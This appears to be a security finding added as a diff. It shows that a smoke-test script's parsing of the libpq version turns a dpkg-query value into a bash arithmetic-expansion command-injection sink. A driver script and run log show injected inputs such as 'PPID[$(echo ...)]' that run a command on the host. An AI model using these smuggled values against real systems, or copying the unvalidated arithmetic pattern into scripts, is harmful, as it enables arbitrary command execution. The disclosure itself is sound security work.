@@ -1,0 +1,29 @@
+# security U0 M-1 proof: scripts/smoke.sh libpq version parse is an arithmetic-expansion sink (2026-10-22)
+# The driver copies smoke.sh's lines verbatim (set -euo pipefail; deb_major, deb_minor, want=$((10#...)))
+# and feeds it a dpkg-query value; a value that runs a command prints PWNED on the host.
+# bash: GNU bash, version 5.3.9(1)-release (x86_64-pc-cygwin)
+## driver <scratch>/arith2.sh:
+#!/usr/bin/env bash
+set -euo pipefail
+deb="$1"
+deb_major="${deb%%.*}"
+deb_minor="$(printf '%s' "$deb" | sed -E 's/^[0-9]+\.([0-9]+).*/\1/')"
+want=$((10#$deb_major * 10000 + 10#$deb_minor))
+echo "want=$want"
+## input: 15.19-0+deb12u1
+want=150019
+exit=0
+## input: a[$(echo PWNED-a >&2)]
+<scratch>/arith2.sh: line 6: 10#a: value too great for base (error token is "10#a")
+<scratch>/arith2.sh: line 7: want: unbound variable
+exit=1
+## input: 0+BASH_VERSINFO[$(echo PWNED-versinfo >&2)]
+PWNED-versinfo
+PWNED-versinfo
+want=50005
+exit=0
+## input: 0+PPID[$(echo PWNED-ppid >&2)]
+PWNED-ppid
+PWNED-ppid
+want=6999569887
+exit=0
